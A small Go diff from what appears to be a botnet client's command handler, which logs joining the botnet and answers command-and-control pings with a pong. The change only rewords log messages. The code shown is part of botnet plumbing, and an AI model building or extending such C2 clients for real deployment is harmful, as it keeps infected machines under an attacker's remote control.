@@ -72,10 +72,10 @@ func (b *Bot) HandleCommandFromCC(c *protocol.Command) error {
 		log.Printf("[cmd&ctrl] WELCOME!!! joined botnet at unix time: %d", time.Now().Unix())
 		return nil
 	case protocol.CommandTypePing:
-		log.Printf("[cmd&ctrl] PING!!! pinged by master at %d. full command: %v", time.Now().Unix(), c)
+		log.Printf("[cmd&ctrl] PING!!! pinged by command and control at %d. full command: %v", time.Now().Unix(), *c)
 		return b.SendMessageToCC(&protocol.Message{Type: protocol.MessageTypePong})
 	default:
-		log.Printf("received unknown event type at %d. full command: %v", time.Now().Unix(), c)
+		log.Printf("received unknown event type at %d. full command: %v", time.Now().Unix(), *c)
 		return nil
 	}
 }
